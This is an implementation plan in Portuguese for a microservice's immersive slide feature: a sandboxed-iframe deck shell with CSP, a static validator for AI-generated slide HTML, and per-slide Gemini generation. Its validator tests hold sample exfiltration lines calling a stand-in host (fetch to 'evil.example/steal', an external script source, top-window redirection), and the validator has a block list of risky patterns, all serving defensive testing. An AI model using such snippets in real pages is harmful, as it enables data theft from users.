# Slides Imersivos — Fundação (shell + validação + geração por slide) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Construir, como módulos novos e isolados (sem ainda substituir o pipeline em produção), o shell de montagem do deck com isolamento por iframe sandboxed, o validador estático de HTML de slide, e a função de geração por slide via Gemini — a base sobre a qual o rework dos endpoints de regeneração e a troca do consumo no mobile (planos seguintes) serão construídos.

**Architecture:** Cada slide é uma marcação HTML livre (gerada pela IA numa chamada Gemini própria por slide, ver spec) que o shell envolve num mini-documento com CSP restritiva própria e injeta num `<iframe sandbox="allow-scripts">`; um shell externo (JS nosso, não sandboxed) navega entre os iframes por índice via tap/swipe. Nada disto é ligado ao pipeline de geração `/api/personalizar` ainda — este plano entrega os 3 módulos testados isoladamente e verificáveis visualmente via um script de QA estendido.

**Tech Stack:** TypeScript (microservice), `node:test`/`node:assert/strict` (test runner já usado no projeto — não é vitest/jest), `@google/genai` (já em uso via `executeWithModelFallback`).

**Spec:** `docs/superpowers/specs/2026-08-03-slides-imersivos-html-ia-design.md`

---

## Escopo deste plano (e o que fica para os próximos)

Este plano cobre a Fase 1 e parte da Fase 2 da spec (shell, validador, geração por
slide) como capacidade nova e testável, sem religar o pipeline existente. Os
próximos planos (a criar depois que este for validado e mergeado):

- **Plano 2** — ligar `generateImmersiveSlideHtml`/`buildImmersiveDeckHtml` no
  `processMediaWithGemini`, substituindo o preenchimento de template atual;
  bump de `PRESENTATION_ENGINE_VERSION`/`PRESENTATION_DESIGN_VERSION`.
- **Plano 3** — rework dos 3 endpoints de regeneração (contrato JSON → HTML)
  nos 4 arquivos já identificados na spec.
- **Plano 4** — troca do consumo no mobile (retirar `PresentationSlidesBlock`/
  `apresentacao-slides`, usar o WebView existente) + QA visual final.

Motivo da divisão: religar o pipeline de geração sem também atualizar os
endpoints de regeneração e o consumo no mobile no mesmo lote quebraria os dois
em produção (eles esperam o formato antigo). Separar em planos permite
validar a fundação isoladamente antes de mexer no que já está no ar.

---

## Estrutura de arquivos

- **Criar:** `microservice/src/lib/slideValidation.ts` — validador estático
  determinístico de HTML de slide (sem rede, sem LLM).
- **Criar:** `microservice/src/lib/slideValidation.test.ts`
- **Criar:** `microservice/src/lib/slideShell.ts` — montagem do deck (wrap por
  slide em mini-documento com CSP + iframes sandboxed + shell de navegação).
- **Criar:** `microservice/src/lib/slideShell.test.ts`
- **Modificar:** `microservice/src/services/geminiService.ts` — nova função
  `generateImmersiveSlideHtml()` (aditiva, não toca nas funções existentes).
- **Criar:** `microservice/src/services/geminiImmersiveSlide.test.ts`
- **Modificar:** `microservice/scripts/renderPresentationQa.ts` — estendido
  para também produzir, por perfil, um deck de exemplo usando o novo shell
  (com HTML de slide fixo/fixture, sem chamar o Gemini de verdade).
- **Modificar:** `microservice/package.json` — registra os 3 novos arquivos
  de teste no script `test` (o runner deste projeto lista arquivos
  explicitamente, não faz glob automático).

---

## Task 1: Validador estático de HTML de slide

**Files:**
- Create: `microservice/src/lib/slideValidation.ts`
- Test: `microservice/src/lib/slideValidation.test.ts`

- [ ] **Step 1: Escrever os testes que falham**

```typescript
// microservice/src/lib/slideValidation.test.ts
import assert from "node:assert/strict";
import { test } from "node:test";
import { validateSlideHtml } from "./slideValidation";

test("rejeita HTML vazio ou só espaço em branco", () => {
  assert.equal(validateSlideHtml("").valid, false);
  assert.equal(validateSlideHtml("   \n\t  ").valid, false);
});

test("rejeita HTML acima do limite de tamanho", () => {
  const huge = `<section>${"a".repeat(30_000)}</section>`;
  const result = validateSlideHtml(huge);
  assert.equal(result.valid, false);
  assert.match(result.reason ?? "", /limite de \d+ caracteres/);
});

test("rejeita padrões de rede/armazenamento mesmo dentro de outras tags", () => {
  const casos = [
    "<script>fetch('https://evil.example/steal')</script>",
    "<script>new XMLHttpRequest()</script>",
    "<script>document.cookie = 'x=1'</script>",
    "<script>localStorage.setItem('a','b')</script>",
    "<script>sessionStorage.getItem('a')</script>",
    "<script>window.top.location = 'https://evil.example'</script>",
    "<script>window.parent.postMessage('x','*')</script>",
    "<script src=\"https://evil.example/x.js\"></script>",
    "<script>eval('1+1')</script>",
  ];
  for (const html of casos) {
    const result = validateSlideHtml(html);
    assert.equal(result.valid, false, `deveria rejeitar: ${html}`);
    assert.ok(result.reason, `deveria ter motivo: ${html}`);
  }
});

test("aceita HTML/CSS/JS legítimo dentro do orçamento", () => {
  const html = `
    <section class="slide">
      <style>.slide { background: #101827; color: #f2f7fa; }</style>
      <h1>Como sistemas distribuídos resolvem consenso</h1>
      <script>
        document.querySelectorAll(".reveal").forEach(function (el) {
          el.addEventListener("click", function () { el.classList.toggle("open"); });
        });
      </script>
    </section>
  `;
  const result = validateSlideHtml(html);
  assert.equal(result.valid, true);
  assert.equal(result.reason, undefined);
});
```

- [ ] **Step 2: Rodar os testes e confirmar que falham (módulo ainda não existe)**

Run: `cd microservice && npx tsx --test src/lib/slideValidation.test.ts`
Expected: FAIL — `Cannot find module './slideValidation'`

- [ ] **Step 3: Implementar o validador**

```typescript
// microservice/src/lib/slideValidation.ts

export interface SlideValidationResult {
  valid: boolean;
  reason?: string;
}

export const MAX_SLIDE_HTML_CHARS = 24_000;

// Padrões que indicariam o slide tentando sair do sandbox (rede, storage,
// navegação pro topo/pai, execução dinâmica de string). O sandbox do iframe
// e o CSP do mini-documento já bloqueiam isso na prática — esta checagem é
// defesa em profundidade: pega cedo, sem depender só do runtime do browser.
const DANGEROUS_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  { pattern: /fetch\s*\(/i, label: "fetch(...)" },
  { pattern: /XMLHttpRequest/i, label: "XMLHttpRequest" },
  { pattern: /document\.cookie/i, label: "document.cookie" },
  { pattern: /localStorage/i, label: "localStorage" },
  { pattern: /sessionStorage/i, label: "sessionStorage" },
  { pattern: /window\.top/i, label: "window.top" },
  { pattern: /window\.parent/i, label: "window.parent" },
  { pattern: /<script[^>]*\bsrc\s*=/i, label: "<script src=...> externo" },
  { pattern: /\beval\s*\(/i, label: "eval(...)" },
  { pattern: /new\s+Function\s*\(/i, label: "new Function(...)" },
];

export function validateSlideHtml(
  html: string,
  maxChars: number = MAX_SLIDE_HTML_CHARS,
): SlideValidationResult {
  if (!html || !html.trim()) {
    return { valid: false, reason: "HTML do slide está vazio" };
  }
  if (html.length > maxChars) {
    return {
      valid: false,
      reason: `HTML do slide excede o limite de ${maxChars} caracteres (${html.length})`,
    };
  }
  for (const { pattern, label } of DANGEROUS_PATTERNS) {
    if (pattern.test(html)) {
      return { valid: false, reason: `HTML do slide contém padrão não permitido: ${label}` };
    }
  }
  return { valid: true };
}
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `cd microservice && npx tsx --test src/lib/slideValidation.test.ts`
Expected: PASS (4 testes)

- [ ] **Step 5: Registrar o teste no script `test` do `package.json` e commitar**

Abra `microservice/package.json`, ache a linha do script `"test"` e adicione
`src/lib/slideValidation.test.ts` à lista (mantendo os arquivos já
existentes, só acrescentando este ao final antes das aspas de fechamento).

Run: `cd microservice && npm test`
Expected: todos os testes (os já existentes + o novo) passam.

```bash
git add microservice/src/lib/slideValidation.ts microservice/src/lib/slideValidation.test.ts microservice/package.json
git commit -m "feat(microservice): valida estaticamente HTML de slide gerado por IA"
```

---

## Task 2: Shell de montagem do deck (iframes sandboxed)

**Files:**
- Create: `microservice/src/lib/slideShell.ts`
- Test: `microservice/src/lib/slideShell.test.ts`

- [ ] **Step 1: Escrever os testes que falham**

```typescript
// microservice/src/lib/slideShell.test.ts
import assert from "node:assert/strict";
import { test } from "node:test";
import { buildImmersiveDeckHtml } from "./slideShell";

test("lança se a lista de slides estiver vazia", () => {
  assert.throws(() => buildImmersiveDeckHtml([], "seeker"), /pelo menos 1 slide/);
});

test("gera um iframe sandboxed por slide, na ordem recebida", () => {
  const html = buildImmersiveDeckHtml(
    ["<section>Slide A</section>", "<section>Slide B</section>"],
    "mastermind",
  );
  const iframeMatches = [...html.matchAll(/<iframe\b[^>]*>/g)];
  assert.equal(iframeMatches.length, 2);
  for (const [tag] of iframeMatches) {
    assert.match(tag, /sandbox="allow-scripts"/);
    assert.doesNotMatch(tag, /allow-same-origin/);
  }
});

test("apenas o primeiro iframe começa ativo", () => {
  const html = buildImmersiveDeckHtml(
    ["<section>A</section>", "<section>B</section>", "<section>C</section>"],
    "seeker",
  );
  const classes = [...html.matchAll(/<iframe class="([^"]*)"/g)].map((m) => m[1]);
  assert.equal(classes[0].includes("active"), true);
  assert.equal(classes[1].includes("active"), false);
  assert.equal(classes[2].includes("active"), false);
});

test("cada iframe embute o conteúdo do slide num mini-documento com CSP restritiva", () => {
  const html = buildImmersiveDeckHtml(["<section>Conteúdo <b>rico</b></section>"], "achiever");
  assert.match(html, /Content-Security-Policy/);
  assert.match(html, /default-src 'none'/);
  // o conteúdo do slide foi HTML-escapado dentro do atributo srcdoc, e não
  // aparece como marcação crua no documento externo
  assert.doesNotMatch(html, /<b>rico<\/b>/);
  assert.match(html, /Conte.do/);
});

test("usa a cor-assinatura do perfil como acento dos indicadores de progresso", () => {
  const html = buildImmersiveDeckHtml(["<section>A</section>"], "daredevil");
  assert.match(html, /#d7263d/i);
});

test("viewport é responsivo (largura do dispositivo, não fixa)", () => {
  const html = buildImmersiveDeckHtml(["<section>A</section>"], "conqueror");
  assert.match(html, /width=device-width/);
  assert.doesNotMatch(html, /width=1280/);
});
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `cd microservice && npx tsx --test src/lib/slideShell.test.ts`
Expected: FAIL — `Cannot find module './slideShell'`

- [ ] **Step 3: Implementar o shell**

```typescript
// microservice/src/lib/slideShell.ts
import { BRAIN_HEX_CONFIG, type BrainHexProfile } from "../constants/brainHex";

function escapeForSrcdocAttribute(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

/**
 * Envolve o fragmento de HTML livre gerado pela IA num mini-documento
 * autocontido com CSP restritiva própria (bloqueia rede/armazenamento na
 * prática, não só por instrução de prompt) — é isto que vira o `srcdoc` do
 * iframe sandboxed daquele slide.
 */
function wrapSlideFragment(fragmentHtml: string): string {
  return `<!doctype html><html><head><meta charset="utf-8" />`
    + `<meta name="viewport" content="width=device-width, initial-scale=1" />`
    + `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; `
    + `style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; font-src data:" />`
    + `</head><body style="margin:0">${fragmentHtml}</body></html>`;
}

/**
 * Monta o deck imersivo final: um documento externo (shell nosso, confiável,
 * não sandboxed) que navega por tap/swipe entre N iframes sandboxados — um
 * por slide, cada um com sua própria CSP restritiva. O conteúdo de cada
 * slide (HTML/CSS/JS livre gerado pela IA) nunca roda no contexto do
 * documento externo.
 */
export function buildImmersiveDeckHtml(
  slidesHtml: string[],
  profile: BrainHexProfile,
): string {
  if (slidesHtml.length === 0) {
    throw new Error("buildImmersiveDeckHtml requer pelo menos 1 slide");
  }
  const accent = BRAIN_HEX_CONFIG[profile].color;

  const frames = slidesHtml
    .map((fragment, index) => {
      const srcdoc = escapeForSrcdocAttribute(wrapSlideFragment(fragment));
      const activeClass = index === 0 ? " active" : "";
      return `<iframe class="slide-frame${activeClass}" data-index="${index}" `
        + `sandbox="allow-scripts" srcdoc="${srcdoc}"></iframe>`;
    })
    .join("\n");

  const dots = slidesHtml
    .map((_, index) => `<span class="dot${index === 0 ? " active" : ""}"></span>`)
    .join("");

  return `<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<style>
  :root { --accent: ${accent}; }
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; height: 100%; background: #05030a; overflow: hidden; }
  .deck { position: relative; width: 100%; height: 100%; }
  .slide-frame {
    position: absolute; inset: 0; width: 100%; height: 100%; border: 0;
    opacity: 0; pointer-events: none; transition: opacity .35s ease;
  }
  .slide-frame.active { opacity: 1; pointer-events: auto; }
  .nav-zone { position: absolute; top: 0; bottom: 0; width: 18%; z-index: 5; }
  .nav-zone.prev { left: 0; }
  .nav-zone.next { right: 0; }
  .dots {
    position: absolute; left: 0; right: 0; bottom: 10px; display: flex;
    justify-content: center; gap: 6px; z-index: 6; pointer-events: none;
  }
  .dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.25); }
  .dot.active { background: var(--accent); width: 18px; border-radius: 4px; }
</style>
</head>
<body>
  <div class="deck" id="deck">
${frames}
    <div class="nav-zone prev" data-dir="-1"></div>
    <div class="nav-zone next" data-dir="1"></div>
    <div class="dots">${dots}</div>
  </div>
  <script>
    (function () {
      var frames = Array.prototype.slice.call(document.querySelectorAll(".slide-frame"));
      var dots = Array.prototype.slice.call(document.querySelectorAll(".dot"));
      var current = 0;
      function show(index) {
        if (index < 0 || index >= frames.length) return;
        frames[current].classList.remove("active");
        dots[current].classList.remove("active");
        current = index;
        frames[current].classList.add("active");
        dots[current].classList.add("active");
      }
      Array.prototype.slice.call(document.querySelectorAll(".nav-zone")).forEach(function (zone) {
        zone.addEventListener("click", function () {
          show(current + Number(zone.getAttribute("data-dir")));
        });
      });
      var touchStartX = null;
      var deckEl = document.getElementById("deck");
      deckEl.addEventListener("touchstart", function (e) {
        touchStartX = e.changedTouches[0].clientX;
      }, { passive: true });
      deckEl.addEventListener("touchend", function (e) {
        if (touchStartX === null) return;
        var delta = e.changedTouches[0].clientX - touchStartX;
        if (Math.abs(delta) > 40) show(current + (delta < 0 ? 1 : -1));
        touchStartX = null;
      }, { passive: true });
    })();
  </script>
</body>
</html>`;
}
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `cd microservice && npx tsx --test src/lib/slideShell.test.ts`
Expected: PASS (6 testes)

- [ ] **Step 5: Registrar o teste no `package.json` e commitar**

Adicione `src/lib/slideShell.test.ts` à lista do script `"test"` em
`microservice/package.json` (mesmo padrão do Step 5 da Task 1).

Run: `cd microservice && npm test`
Expected: todos os testes passam.

```bash
git add microservice/src/lib/slideShell.ts microservice/src/lib/slideShell.test.ts microservice/package.json
git commit -m "feat(microservice): monta deck imersivo com iframes sandboxed por slide"
```

---

## Task 3: Geração de HTML de slide por IA (por slide, não deck inteiro)

**Files:**
- Modify: `microservice/src/services/geminiService.ts`
- Test: `microservice/src/services/geminiImmersiveSlide.test.ts`

- [ ] **Step 1: Escrever os testes que falham**

```typescript
// microservice/src/services/geminiImmersiveSlide.test.ts
import assert from "node:assert/strict";
import { test } from "node:test";
import { generateImmersiveSlideHtml } from "./geminiService";

test("chama o executor com o design token do perfil e o conteúdo do slide no prompt", async () => {
  let capturedSystemInstruction = "";
  let capturedUserText = "";
  const fakeExecutor = async (params: { systemInstruction: string; contentsParts: any[] }) => {
    capturedSystemInstruction = params.systemInstruction;
    capturedUserText = params.contentsParts.map((p: any) => p.text).join("\n");
    return { html: "<section>ok</section>" };
  };

  const html = await generateImmersiveSlideHtml(
    {
      index: 0,
      total: 3,
      contentSummary: "Como o teorema CAP define trade-offs em sistemas distribuídos.",
      profile: "mastermind",
    },
    { executor: fakeExecutor as any },
  );

  assert.equal(html, "<section>ok</section>");
  assert.match(capturedSystemInstruction, /#5b3fd9/i);
  assert.match(capturedUserText, /teorema CAP/);
});

test("passa o HTML do slide anterior como referência de continuidade, quando houver", async () => {
  let capturedUserText = "";
  const fakeExecutor = async (params: { contentsParts: any[] }) => {
    capturedUserText = params.contentsParts.map((p: any) => p.text).join("\n");
    return { html: "<section>ok</section>" };
  };

  await generateImmersiveSlideHtml(
    {
      index: 1,
      total: 3,
      contentSummary: "Consistência eventual.",
      profile: "seeker",
      previousSlideHtml: "<section>slide anterior</section>",
    },
    { executor: fakeExecutor as any },
  );

  assert.match(capturedUserText, /slide anterior/);
});

test("repete a geração se a validação estática falhar, e lança depois de esgotar as tentativas", async () => {
  let calls = 0;
  const fakeExecutor = async () => {
    calls += 1;
    return { html: "<script>fetch('https://evil.example')</script>" };
  };

  await assert.rejects(
    () => generateImmersiveSlideHtml(
      { index: 0, total: 1, contentSummary: "x", profile: "achiever" },
      { executor: fakeExecutor as any, maxAttempts: 2 },
    ),
    /Falha ao gerar slide imersivo/,
  );
  assert.equal(calls, 2);
});

test("aceita na primeira tentativa válida, sem repetir chamadas desnecessárias", async () => {
  let calls = 0;
  const fakeExecutor = async () => {
    calls += 1;
    return { html: "<section>slide válido</section>" };
  };

  const html = await generateImmersiveSlideHtml(
    { index: 0, total: 1, contentSummary: "x", profile: "survivor" },
    { executor: fakeExecutor as any, maxAttempts: 3 },
  );

  assert.equal(html, "<section>slide válido</section>");
  assert.equal(calls, 1);
});
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `cd microservice && npx tsx --test src/services/geminiImmersiveSlide.test.ts`
Expected: FAIL — `generateImmersiveSlideHtml is not a function` (ou export ausente)

- [ ] **Step 3: Implementar `generateImmersiveSlideHtml`**

Abra `microservice/src/services/geminiService.ts`. Confirme que `Type` (de
`@google/genai`) já está importado no topo do arquivo (é usado por
`regenerateSlideContent` mais abaixo) — não precisa adicionar import novo
para isso. Adicione a nova função e seus tipos de suporte próximo às outras
funções `Regenerate*` (ex.: logo antes de `regenerateChapterContent`),
importando o validador:

```typescript
import { validateSlideHtml } from "../lib/slideValidation";
```

```typescript
export interface ImmersiveSlideInput {
  index: number;
  total: number;
  contentSummary: string;
  profile: BrainHexProfile;
  previousSlideHtml?: string;
}

export interface ImmersiveSlideOptions {
  keysConfig?: ApiKeysConfig;
  maxAttempts?: number;
  executor?: typeof executeWithModelFallback;
}

/**
 * Gera o HTML/CSS/JS livre de UM slide (não o deck inteiro numa chamada —
 * mesmo motivo documentado em geminiBlockBatches.ts para o texto: uma
 * chamada grande estoura orçamento de output e perde qualidade). Cada slide
 * recebe os design tokens do perfil e, quando houver, o HTML do slide
 * anterior só como referência de continuidade visual.
 */
export async function generateImmersiveSlideHtml(
  input: ImmersiveSlideInput,
  options: ImmersiveSlideOptions = {},
): Promise<string> {
  const executor = options.executor ?? executeWithModelFallback;
  const maxAttempts = Math.max(1, options.maxAttempts ?? 3);
  const config = BRAIN_HEX_CONFIG[input.profile];

  const systemInstruction = `
    Você é um designer/desenvolvedor front-end de elite criando UM slide de
    uma apresentação educacional imersiva, para o perfil BrainHex ${input.profile}
    (Guia Alquímico ${config.guideName}).
    Gere APENAS o fragmento HTML deste slide (uma tag <section> raiz, com
    <style> e <script> internos, escopados a essa seção — nunca toque em
    elementos fora dela).
    Cor-assinatura oficial do perfil: ${config.color}. Use-a como acento
    principal; eleve a luminosidade HSL quando precisar de contraste AAA
    contra um fundo escuro (nunca misture com branco, isso dessatura a cor).
    Layout mobile-first: unidades relativas (%, vw, vh, rem), sem largura
    fixa, sem scroll horizontal. Este é o slide ${input.index + 1} de
    ${input.total} do deck.
    Pode incluir interatividade leve dentro da própria seção (toque para
    revelar/expandir, transições de entrada, pequenas animações CSS/JS) —
    mas o script não pode acessar rede, cookies, localStorage/sessionStorage,
    nem tentar sair da própria seção (sem window.top/window.parent).
    ${input.previousSlideHtml
      ? `Slide anterior deste deck (só para referência de estilo, não copie o conteúdo): ${input.previousSlideHtml}`
      : ""}
  `;

  const contentsParts = [{
    text: `Conteúdo deste slide:\n${input.contentSummary}\n\n`
      + "Gere o HTML/CSS/JS completo deste slide agora.",
  }];

  const responseSchema = {
    type: Type.OBJECT,
    properties: { html: { type: Type.STRING } },
    required: ["html"],
  };

  let lastReason = "motivo desconhecido";
  for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
    const result = await executor<{ html: string }>({
      contentsParts,
      systemInstruction,
      responseSchema,
      customKeys: options.keysConfig,
      temperature: 0.7,
    });
    const validation = validateSlideHtml(result.html);
    if (validation.valid) return result.html;
    lastReason = validation.reason ?? lastReason;
  }
  throw new Error(
    `Falha ao gerar slide imersivo após ${maxAttempts} tentativa(s): ${lastReason}`,
  );
}
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `cd microservice && npx tsx --test src/services/geminiImmersiveSlide.test.ts`
Expected: PASS (4 testes)

- [ ] **Step 5: Registrar o teste no `package.json`, rodar a suíte inteira e commitar**

Adicione `src/services/geminiImmersiveSlide.test.ts` à lista do script
`"test"` em `microservice/package.json`.

Run: `cd microservice && npm test`
Expected: todos os testes (existentes + os 3 arquivos novos desta feature)
passam.

```bash
git add microservice/src/services/geminiService.ts microservice/src/services/geminiImmersiveSlide.test.ts microservice/package.json
git commit -m "feat(microservice): gera HTML de slide imersivo por IA, um slide por chamada"
```

---

## Task 4: Estender o script de QA visual manual

**Files:**
- Modify: `microservice/scripts/renderPresentationQa.ts`

Este script já existe e gera, para cada um dos 7 perfis, um deck de amostra
usando o template ANTIGO (`buildDeckHtml` com slides JSON sintéticos) — é
usado hoje só para inspeção visual manual, sem chamar o Gemini de verdade.
Vamos adicioná-lo (sem remover o que já existe) para também gerar, por
perfil, um deck de amostra usando o **novo** shell, com HTML de slide fixo
(fixture) — permite abrir no navegador e conferir visualmente que os
iframes sandboxed renderizam, a navegação por tap funciona, e o viewport é
responsivo, sem depender de uma chamada real ao Gemini.

- [ ] **Step 1: Ler o arquivo atual para saber onde inserir**

Abra `microservice/scripts/renderPresentationQa.ts` e localize a função
`main()` (por volta da linha 41) e o `import` no topo do arquivo.

- [ ] **Step 2: Adicionar o import do novo shell**

No topo do arquivo, junto aos imports existentes:

```typescript
import { buildImmersiveDeckHtml } from "../src/lib/slideShell";
```

- [ ] **Step 3: Adicionar a geração do deck imersivo de amostra dentro do loop de perfis**

Dentro do `for (const profile of PROFILES)` já existente em `main()`, logo
após a linha `fs.writeFileSync(path.join(outputDir, \`${profile}.html\`), html, "utf-8");`
(a que grava o deck do template antigo), adicione:

```typescript
    const immersiveFixtureSlides = [
      `<section style="height:100%;display:flex;flex-direction:column;justify-content:center;padding:8vw;background:linear-gradient(160deg,#0a0716,#14102b);color:#f7f4ff;font-family:system-ui,sans-serif;">
        <h1 style="font-size:7vw;margin:0 0 3vw;">${config.label}: abertura imersiva</h1>
        <p style="font-size:4vw;opacity:.8;">Slide de amostra — fixture fixo, sem chamada ao Gemini.</p>
      </section>`,
      `<section style="height:100%;display:flex;align-items:center;justify-content:center;padding:8vw;background:#0a0716;color:${config.color};font-family:system-ui,sans-serif;">
        <button class="reveal" style="font-size:4vw;padding:3vw 6vw;border-radius:99px;border:1px solid currentColor;background:transparent;color:inherit;">Toque para revelar</button>
        <script>
          document.querySelectorAll(".reveal").forEach(function (el) {
            el.addEventListener("click", function () { el.textContent = "Revelado!"; });
          });
        </script>
      </section>`,
    ];
    const immersiveHtml = buildImmersiveDeckHtml(immersiveFixtureSlides, profile);
    fs.writeFileSync(path.join(outputDir, `${profile}-imersivo.html`), immersiveHtml, "utf-8");
```

- [ ] **Step 4: Rodar o script e conferir a saída**

Run: `cd microservice && npx tsx scripts/renderPresentationQa.ts qa-presentation-output`
Expected: imprime o caminho de saída; a pasta `qa-presentation-output/`
agora contém, além dos 7 arquivos `<perfil>.html` já existentes, 7 novos
`<perfil>-imersivo.html`.

- [ ] **Step 5: Abrir pelo menos 2 dos novos arquivos num navegador e confirmar visualmente**

Abra `qa-presentation-output/seeker-imersivo.html` e
`qa-presentation-output/daredevil-imersivo.html` diretamente no navegador
(duplo clique ou `file://`). Confirme:
- a tela ocupa a largura toda sem scroll horizontal (redimensione a janela
  pra simular mobile — deve continuar sem quebrar);
- tocar/clicar nas laterais (18% esquerda/direita) troca de slide;
- no segundo slide, tocar em "Toque para revelar" muda o texto do botão;
- os pontinhos de progresso na parte de baixo acendem na cor do perfil.

- [ ] **Step 6: Commitar**

```bash
git add microservice/scripts/renderPresentationQa.ts
git commit -m "chore(microservice): estende QA visual pro shell de deck imersivo"
```

---

## Self-Review desta seção (conferido antes de entregar)

- **Cobertura da spec:** shell com iframes sandboxed (Task 2), CSP por slide
  (Task 2 Step 3), validação estática com defesa em profundidade (Task 1),
  geração por slide com retry (Task 3), continuidade visual via slide
  anterior (Task 3), QA visual manual (Task 4). Rework dos endpoints de
  regeneração, wiring no pipeline `/api/personalizar`, troca de consumo no
  mobile e bump de versão ficam para os Planos 2–4 (fora de escopo aqui,
  conforme já declarado).
- **Sem placeholders:** todo código é completo e executável como escrito.
- **Consistência de tipos:** `generateImmersiveSlideHtml(input, options)` em
  Task 3 usa exatamente `ImmersiveSlideInput`/`ImmersiveSlideOptions`
  definidos ali mesmo; `buildImmersiveDeckHtml(slidesHtml, profile)` em
  Task 2 é chamado com essa mesma assinatura em Task 4.

---

## Próximo passo depois deste plano

Depois deste plano validado e mergeado, o Plano 2 (wiring no pipeline de
geração + bump de versão) pode ser escrito reaproveitando
`generateImmersiveSlideHtml`/`buildImmersiveDeckHtml`/`validateSlideHtml`
como blocos já prontos e testados.
